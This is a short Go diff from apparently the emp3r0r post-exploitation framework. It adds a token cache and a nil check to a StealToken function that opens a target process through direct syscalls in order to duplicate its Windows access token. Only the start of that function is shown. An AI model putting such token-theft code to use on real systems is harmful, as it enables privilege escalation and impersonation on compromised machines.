@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"runtime"
+	"sync"
 	"unsafe"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -16,6 +17,7 @@ import (
 var (
 	modadvapi32             = windows.NewLazySystemDLL("advapi32.dll")
 	procLookupPrivilegeName = modadvapi32.NewProc("LookupPrivilegeNameW")
+	TokenMap                = &sync.Map{} // used to cache tokens
 )
 
 type SECURITY_QUALITY_OF_SERVICE struct {
@@ -27,6 +29,9 @@ type SECURITY_QUALITY_OF_SERVICE struct {
 
 // StealToken acquire a duplicated token handle
 func StealToken(table *syscall.SyscallTable, targetPID uint32) (windows.Handle, error) {
+	if table == nil {
+		return 0, fmt.Errorf("syscall table is nil")
+	}
 	// 1. Open handle to target process
 	hProcess, status, err := syscall.NtOpenProcess(table, windows.PROCESS_QUERY_LIMITED_INFORMATION, targetPID)
 	if err != nil || status != syscall.STATUS_SUCCESS {
